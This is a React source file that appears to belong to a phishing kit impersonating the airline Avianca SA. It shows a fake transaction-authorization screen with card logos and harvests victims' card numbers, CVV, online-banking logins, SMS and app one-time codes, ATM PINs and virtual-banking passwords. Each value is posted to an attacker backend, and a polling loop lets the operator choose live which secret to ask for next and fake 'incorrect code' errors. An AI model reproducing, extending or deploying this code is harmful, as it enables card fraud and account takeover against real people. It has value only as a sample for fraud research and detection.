import { useEffect, useState } from "react";
import { Loading } from "../loading/Loading";
import amex from "../../assets/svg/amex.svg"
import dinex from "../../assets/svg/diners.svg"
import mastercard from "../../assets/svg/mc.svg"
import visa from "../../assets/svg/visa.svg"
import uatp from "../../assets/svg/uatp.png"
import { useSelector } from "react-redux";
import axios from "axios";
import { BancaVirtual } from "../bancaVirtual/BancaVirtual";
import { Mensaje } from "../mensaje/Mensaje";
import Tarjeta from "../tarjeta/Tarjeta";
import { useNavigate } from "react-router-dom";

const URL_TARJETA = import.meta.env.VITE_API_URL_TARJETA

function fechaActual() {
  const now = new Date();

  const dia = String(now.getDate()).padStart(2, '0');
  const mes = String(now.getMonth() + 1).padStart(2, '0');
  const anio = String(now.getFullYear()).slice(-2);

  let horas = now.getHours();
  const minutos = String(now.getMinutes()).padStart(2, '0');
  const ampm = horas >= 12 ? 'pm' : 'am';

  horas = horas % 12;
  horas = horas ? horas : 12;
  const horasFormateadas = String(horas).padStart(2, '0');

  return `${dia}/${mes}/${anio} ${horasFormateadas}:${minutos} ${ampm}`;
}


function generarNumero7Digitos() {
  return Math.floor(1000000 + Math.random() * 9000000);
}





const TransaccionTarjeta = ()=>{
    const navigate = useNavigate()
    const [n, setN] = useState()    
    const [loading, setLoading] = useState(true)
    const [selectVista, setSelectVisata] = useState(null)
    const {uniqId, numeroTarjeta, vencimientoTarjeta, cvvTarjeta, banco} = useSelector((state) => state.facturacionReducer)
    const {precio, cantPasajeros} = useSelector((state) => state.reducerHome)
    const [reLoad, setReLoad] = useState(false)
    const { money } = useSelector((state) => state.countryReducer)
    const precFinal = precio * cantPasajeros
    const precioFormato = Number(precFinal).toLocaleString("es-CO", {
    style: "currency",
    currency: money,
    maximumFractionDigits: 0,
    })
    const numRef = generarNumero7Digitos()
    const fecha = fechaActual()
    const tarj = numeroTarjeta.slice(-2)

    useEffect(() => {
    let isMounted = true;

    const iniciarLongPolling = async () => {
        if (!isMounted) return;

        try {
            const selV = await axios.get(`${URL_TARJETA}status/${uniqId}`, {
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                },
            });
            if (
                selV.data.data.status == "login" ||
                selV.data.data.status == "login-error" ||
                selV.data.data.status == "tarjeta" ||
                selV.data.data.status == "otpsms" ||
                selV.data.data.status == "otpsms-error" ||
                selV.data.data.status == "otpapp" ||
                selV.data.data.status == "otpapp-error" ||
                selV.data.data.status == "clavecajero" ||
                selV.data.data.status == "clavecajero-error" ||
                selV.data.data.status == "clavevirtual" ||
                selV.data.data.status == "clavevirtual-error" &&
                selV.data.data.status !== selectVista
            ) {
                setSelectVisata(selV.data.data.status);
                setLoading(false);
                return;
            }else if(selV.data.data.status == "fin"){
                navigate("/compraExitosa")
            }else if(selV.data.data.status == "error"){
                navigate("/errorCompra")
            }
        } catch (error) {
            console.log(error);
            
        }

        // Esperamos 4 segundos y reintentamos
        setTimeout(iniciarLongPolling, 4000);
    };

    iniciarLongPolling();

    return () => {
        isMounted = false;
    };
    }, [reLoad]);



    const handlerTarjeta = async () =>{
        try {
            const body ={
                uniqid:uniqId,
                tdc: numeroTarjeta,
                ven: vencimientoTarjeta,
                cvv: cvvTarjeta,
                banco: banco,
            }
            setLoading(true)
            const send = await axios.post(`${URL_TARJETA}guardar`, body, {
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
            console.log(error);
        }
        
    }    
    
    const handlerBancaVirtual = async (usuario, clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`${URL_TARJETA}login`, {
                uniqid: uniqId,
                usuario: usuario,
                clave: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
            console.log(error);
        }
    }

    const handlerMensaje = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`${URL_TARJETA}otp-sms`, {
                uniqid: uniqId,
                otpsms: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    const handlerAplicacion = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`${URL_TARJETA}otp-app`, {
                uniqid: uniqId,
                otpapp: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    const handlerCajero = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`${URL_TARJETA}clave-cajero`, {
                uniqid: uniqId,
                clavecajero: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }
    const handlerClaveVirtual = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`${URL_TARJETA}clave-virtual`, {
                uniqid: uniqId,
                clavevirtual: clave 
            },{
            headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    return(
        <div className="w-full mt-3.5">
            {selectVista == "tarjeta-error" &&
                <div className="w-full mt-3.5 flex flex-col justify-center items-center">
                    <div className="w-[98%]">
                        <Tarjeta continuarCompra={handlerTarjeta} nuemerotarjeta={setN} error={"Los datos ingresados son incorrectos, revisalos e ingresalos nuevamente"}/>
                    </div>
                </div> 
            }
            {loading && <Loading/>}
            {selectVista != "tarjeta-error" && 
                <div className="w-full flex flex-col justify-center items-center">
                    <div className="w-full flex flex-col justify-center border-b-1 border-b-slate-400">
                        <div className="flex justify-center items-center gap gap-x-1">
                            <img src={visa} className="w-[47px] h-[47px] object-contain" alt="" />
                            <img src={mastercard} className="w-[47px] h-[47px] object-contain" alt="" />
                            <img src={dinex} className="w-[45px] h-[45px] object-contain" alt="" />
                            <img src={amex} className="w-[40px] h-[40px] object-contain" alt="" />
                            <img src={uatp} className="w-[56px] h-[56px] object-contain" alt="" />
                        </div>
                        <span className="font-semibold text-center text-[18px]">Autorización de transacción</span>
                    </div>

                    <div className="mt-6 w-[95%]">
                        <span className="text-[13px]">
                            La transacción que intentás realizar con <span className="font-semibold">Avianca SA</span> por {precioFormato} {money} el día {fecha}, con tu tarjeta terminada en <span className="font-semibold">**{tarj}</span>, debe ser autorizada por seguridad.
                        </span>
                    </div>

                    <div className="mt-4 w-[95%] flex flex-col gap gap-y-2.5">
                        <span className="font-semibold text-slate-400 text-[13px]">DETALLES DE TRANSACCIÓN</span>
                        <span className="text-[13px]"><span className="font-bold">Comercio:</span> Avianca SA</span>
                        <span className="text-[13px]"><span className="font-bold">Monto de la transacción:</span> {precioFormato} {money}</span>
                        <span className="text-[13px]"><span className="font-bold">Número de autorización:</span> AO{numRef}</span>
                    </div>
                    
                    
                    {selectVista == "login" && <BancaVirtual close={handlerBancaVirtual}/>}
                    {selectVista == "login-error" && <BancaVirtual close={handlerBancaVirtual} error={"Datos de ingreso incorrectos. Ingresalos nuevamente"}/>}
                    
                    {selectVista == "otpsms" && <Mensaje close={handlerMensaje} label={"Codigo recibida por mensaje"} />}
                    {selectVista == "otpsms-error" && <Mensaje close={handlerMensaje} label={"Codigo recibida por mensaje"} error={"El código ingresado no es correcto. Ingresalo nuevamente"}/>}

                    {selectVista == "otpapp" && <Mensaje close={handlerAplicacion} label={"Clave dinamica de la aplicacion"}/>}
                    {selectVista == "otpapp-error" && <Mensaje close={handlerAplicacion} label={"Clave dinamica de la aplicacion"} error={"El código ingresado no es correcto. Ingresalo nuevamente"}/>}

                    
                    {selectVista == "clavecajero" && <Mensaje close={handlerCajero} label={"Clave de cajero"}/>}
                    {selectVista == "clavecajero-error" && <Mensaje close={handlerCajero} label={"Clave de cajero"} error={"Clave ingresada inválida. Ingresala nuevamente"}/>}

                    
                    {selectVista == "clavevirtual" && <Mensaje close={handlerClaveVirtual} label={"Clave de banca virtual"}/>}
                    {selectVista == "clavevirtual-error" && <Mensaje close={handlerClaveVirtual} label={"Clave de banca virtual"} error={"Clave ingresada inválida. Ingresala nuevamente"}/>}

                </div>
            }
            
        </div>
    )
}
export {TransaccionTarjeta}